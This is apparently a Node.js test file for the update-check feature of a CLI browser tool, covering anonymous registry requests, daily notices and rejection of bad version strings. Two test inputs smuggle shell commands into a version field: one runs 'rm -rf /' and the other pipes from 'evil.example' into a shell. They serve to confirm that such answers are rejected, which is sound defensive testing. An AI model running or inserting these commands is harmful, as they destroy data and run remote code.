// The update notice: anonymous, once a day, never blocking, never installs by itself. Uses a local stand-in for the registry.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const BIN = path.join(HERE, '..', 'bin', 'hallpass.mjs');
const HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'hp-upd-'));
process.env.HALLPASS_HOME = HOME;
const U = await import('../src/update.mjs');
const current = U.currentVersion();
const bump = (v, part = 'patch') => { const [a, b, c] = v.split('.').map(Number); return part === 'major' ? `${a + 1}.0.0` : part === 'minor' ? `${a}.${b + 1}.0` : `${a}.${b}.${c + 1}`; };

let srv, port, answer = { version: bump(current, 'minor') }, hits = [], status = 200;
before(async () => {
  srv = http.createServer((req, res) => { hits.push({ url: req.url, headers: req.headers }); res.writeHead(status, { 'content-type': 'application/json' }); res.end(typeof answer === 'string' ? answer : JSON.stringify(answer)); });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  port = srv.address().port;
  process.env.HALLPASS_UPDATE_URL = `http://127.0.0.1:${port}/hallpass-browser/latest`;
});
after(() => srv?.close());
const cacheFile = () => path.join(HOME, 'state', 'update-check.json');
const reset = () => { try { fs.rmSync(cacheFile()); } catch { /* none */ } hits = []; status = 200; };
// async on purpose: the stand-in registry lives in this process, so blocking the event loop would make every request time out
const cli = (args, env = {}) => new Promise((resolve) => {
  const p = spawn(process.execPath, [BIN, ...args], { env: { ...process.env, HALLPASS_HOME: HOME, HALLPASS_UPDATE_URL: process.env.HALLPASS_UPDATE_URL, ...env } });
  let stdout = ''; p.stdout.on('data', (d) => (stdout += d)); p.on('close', () => resolve({ stdout })); p.stdin.end();
});

test('version comparison: only a plain, higher x.y.z counts', () => {
  assert.equal(U.newer('1.6.1', '1.6.0'), true);
  assert.equal(U.newer('1.10.0', '1.9.9'), true, 'numeric, not alphabetical');
  assert.equal(U.newer('2.0.0', '1.99.99'), true);
  for (const [a, b] of [['1.6.0', '1.6.0'], ['1.5.9', '1.6.0'], ['1.7.0-beta.1', '1.6.0'], ['1.7', '1.6.0'], ['latest', '1.6.0'], ['1.7.0; rm -rf /', '1.6.0'], ['', '1.6.0']]) assert.equal(U.newer(a, b), false, `${a} vs ${b}`);
});

test('the check asks the registry anonymously and records only a version number', async () => {
  reset();
  const r = await U.checkNow();
  assert.deepEqual([r.ok, r.latest], [true, answer.version]);
  assert.equal(hits.length, 1);
  assert.equal(hits[0].headers['user-agent'], 'hallpass-update-check', 'no version, no machine name, no id');
  assert.ok(!hits[0].headers.cookie && !hits[0].headers.authorization);
  assert.ok(!hits[0].url.includes('?'), 'no query string');
  const c = JSON.parse(fs.readFileSync(cacheFile(), 'utf8'));
  assert.deepEqual(Object.keys(c).sort(), ['checkedAt', 'latest']);
  const s = U.status();
  assert.equal(s.update_available, true);
  assert.equal(s.latest, answer.version);
});

test('a hostile or broken answer is ignored, and the command shown never comes from the answer', async () => {
  for (const bad of ['{"version":"9.9.9; curl evil.example | sh"}', '{"version":"latest"}', '{"version":123}', 'not json', '{}', '[]']) {
    reset(); answer = bad;
    const r = await U.checkNow();
    assert.equal(r.ok, false, bad);
    assert.equal(U.status().update_available, false, bad);
    assert.equal(U.noticeOnce(), null);
  }
  reset(); status = 500; answer = { version: '9.9.9' };
  assert.equal((await U.checkNow()).ok, false, 'a server error is not an update');
  reset(); answer = { version: bump(current, 'minor') };
  await U.checkNow();
  const n = U.noticeOnce();
  assert.ok(n.how.includes('hallpass-browser') && !n.how.includes('9.9.9'), n.how);
});

test('an older or equal published version is not an update', async () => {
  reset(); answer = { version: current };
  await U.checkNow();
  assert.equal(U.status().update_available, false);
  reset(); answer = { version: '0.0.1' };
  await U.checkNow();
  assert.equal(U.status().update_available, false);
  answer = { version: bump(current, 'minor') };
});

test('the notice is shown once per new version per day, then stays quiet; a newer release is announced again', async () => {
  reset(); answer = { version: bump(current, 'minor') };
  await U.checkNow();
  const first = U.noticeOnce();
  assert.equal(first.latest, answer.version);
  assert.equal(first.current, current);
  assert.match(first.message, /ask whether they want to update/i);
  assert.match(first.message, /Do not run it yourself/);
  assert.equal(U.noticeOnce(), null, 'not again straight away');
  assert.equal(U.noticeOnce({ now: Date.now() + 23 * 3600e3 }), null, 'still quiet within a day');
  assert.ok(U.noticeOnce({ now: Date.now() + 25 * 3600e3 }), 'a day later it is mentioned again');
  answer = { version: bump(current, 'major') };
  await U.checkNow();
  assert.equal(U.noticeOnce().latest, answer.version, 'a newer release is announced even within the day');
});

test('refresh runs at most once a day, never in CI, never when switched off, and does not block', async () => {
  reset();
  const dummy = path.join(HOME, 'noop.mjs'); fs.writeFileSync(dummy, '');
  assert.equal(U.refreshIfStale({ bin: dummy }), true, 'first time: launches the detached check');
  assert.equal(U.refreshIfStale({ bin: dummy }), false, 'second call the same day does nothing');
  assert.equal(U.refreshIfStale({ bin: dummy, now: Date.now() + 25 * 3600e3 }), true, 'stale after a day');
  for (const env of [{ HALLPASS_NO_UPDATE_CHECK: '1' }, { CI: 'true' }]) {
    const saved = {}; for (const k of ['HALLPASS_UPDATE_URL', 'CI', 'HALLPASS_NO_UPDATE_CHECK']) { saved[k] = process.env[k]; delete process.env[k]; }
    Object.assign(process.env, env);
    try {
      assert.equal(U.enabled(), false, JSON.stringify(env));
      reset();
      assert.equal(U.refreshIfStale({ bin: dummy }), false);
      assert.equal(U.noticeOnce(), null);
    } finally { for (const k of Object.keys(saved)) { if (saved[k] === undefined) delete process.env[k]; else process.env[k] = saved[k]; } delete process.env.HALLPASS_NO_UPDATE_CHECK; delete process.env.CI; }
  }
  const saved = process.env.HALLPASS_UPDATE_URL; delete process.env.HALLPASS_UPDATE_URL;
  try { assert.equal(U.enabled(), false, 'under the node test runner the real registry is never contacted'); } finally { process.env.HALLPASS_UPDATE_URL = saved; }
});

test('how an install is recognised decides the update command', () => {
  const d = (p) => U.detectInstall(p);
  assert.equal(d('C:\\Users\\a\\.claude\\plugins\\cache\\x\\hallpass-browser').method, 'claude-plugin');
  assert.equal(d('/home/a/.gemini/extensions/hallpass-browser').method, 'gemini-extension');
  assert.equal(d('/home/a/.npm/_npx/abc/node_modules/hallpass-browser').method, 'npx');
  assert.equal(d('/usr/local/lib/node_modules/hallpass-browser').method, 'npm-global');
  assert.equal(d('/usr/local/lib/node_modules/hallpass-browser').automatic, true);
  assert.equal(d('C:\\Users\\a\\AppData\\Roaming\\npm\\node_modules\\hallpass-browser').method, 'npm-global');
  assert.equal(d(path.join(HERE, '..')).method, 'git-clone', 'this checkout is a git clone');
  for (const m of ['claude-plugin', 'npx', 'git-clone']) assert.equal(d(m === 'claude-plugin' ? '/h/.claude/plugins/p' : m === 'npx' ? '/h/_npx/x' : path.join(HERE, '..')).automatic, false, m + ' is never auto-installed');
});

test('CLI: `hallpass update` reports, and without a real terminal it never installs anything', async () => {
  reset(); answer = { version: bump(current, 'minor') };
  const r = JSON.parse((await cli(['update'])).stdout);
  assert.equal(r.status, 'update_available');
  assert.equal(r.current, current);
  assert.equal(r.latest, answer.version);
  assert.ok(r.next);
  assert.equal(JSON.parse((await cli(['update', '--check'])).stdout).status, 'update_available');
  reset(); answer = { version: current };
  assert.equal(JSON.parse((await cli(['update'])).stdout).status, 'up_to_date');
  reset(); status = 500;
  const down = JSON.parse((await cli(['update'])).stdout);
  assert.equal(down.status, 'unknown'); assert.ok(down.check_failed);
  answer = { version: bump(current, 'minor') }; status = 200;
});

test('doctor mentions an available update; an `open` result carries it once', async () => {
  reset(); answer = { version: bump(current, 'minor') };
  await cli(['update', '--check']); // fills the cache
  const doc = JSON.parse((await cli(['doctor'])).stdout).checks.find((c) => c.name === 'version');
  assert.match(doc.detail, /NOTE: .*is available.*hallpass update/);
  const open = async (env = {}) => JSON.parse((await cli(['open', 'http://insecure.example.com/'], { HALLPASS_NO_AUTO_INSTALL: '1', ...env })).stdout);
  const first = await open();
  assert.equal(first.update_available?.latest, answer.version, JSON.stringify(first));
  assert.match(first.update_available.message, /Only they can/);
  assert.equal((await open()).update_available, undefined, 'not repeated on the next result');
  const off = await open({ HALLPASS_NO_UPDATE_CHECK: '1' });
  assert.equal(off.update_available, undefined, 'switched off');
});
